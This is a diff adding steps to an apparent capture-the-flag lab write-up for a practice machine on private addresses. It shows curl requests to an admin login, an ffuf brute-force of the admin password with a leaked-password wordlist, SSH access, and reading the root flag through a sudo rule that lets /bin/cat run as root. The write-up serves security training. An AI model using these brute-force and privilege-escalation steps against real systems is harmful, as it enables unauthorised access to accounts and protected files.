@@ -83,3 +83,77 @@ ssh -i key john@10.49.161.41
 And when prompted for the password i entered the password.
 
 Make sure to give key the 600 permision before connecting to ssh using the key.
+
+After it we need to bruteforce the password of here too.
+
+So to do the bruteforcing we need to first inquire that what ffuf req is acceptable
+
+since when we saw the req with curl
+
+I was it was accepting a csrf token.
+
+so for curl we need to use that csrf token too to get our request successful
+
+So i did
+
+```bash
+curl -i -L \        
+  -c cookies.txt \             
+  -b cookies.txt \           
+  -d "user=admin&pass=Wrongpass" \
+  http://10.49.161.41/admin/ 
+```
+
+Then i got the result as error that username or password is invalid.
+
+That means our curl is working we will now create our fuzz as according to this curl.
+
+before doing enumuration we need to first find size of requ with the command
+
+curl -s -L -d "user=admin&pass=wrong" http://10.49.161.41/admin/ | wc -c
+
+After seeing the size of wrong pass we will know how much to filter.
+
+And with this command below we will get the correct password.
+
+```bash
+ffuf -u http://10.49.156.209/admin/ \
+     -X POST \
+     -H "Content-Type: application/x-www-form-urlencoded" \
+     -d "user=admin&pass=FUZZ" \
+     -w /home/Seclists/Passwords/Leaked-Databases/rockyou-75.txt -fs 733
+
+```
+![web interface after logging in](https://miro.medium.com/v2/resize:fit:640/format:webp/0*NhbuSbJwpw0EYBTx.png)
+
+
+After lgogging in we are now loggedin with the brutefoced password
+
+
+
+after login we are welcomed with our web flag.
+
+
+since we have got that ssh shell now get back to it.
+
+
+there is a user.txt which is a flag and it is at the location 
+
+/home/john/user.txt which is the anser of the quesiton what is user.txt?
+
+
+and now its time for the privilage escalation 
+
+since the ssh shell is not as a root shell.
+
+For this we will do sudo -l
+
+And that binary is /bin/cat which can be executed as root without any password
+
+now its time to get the root flag with this.
+
+for this we used
+
+sudo /bin/cat /root/root.txt
+
+And in this way we got our root flag
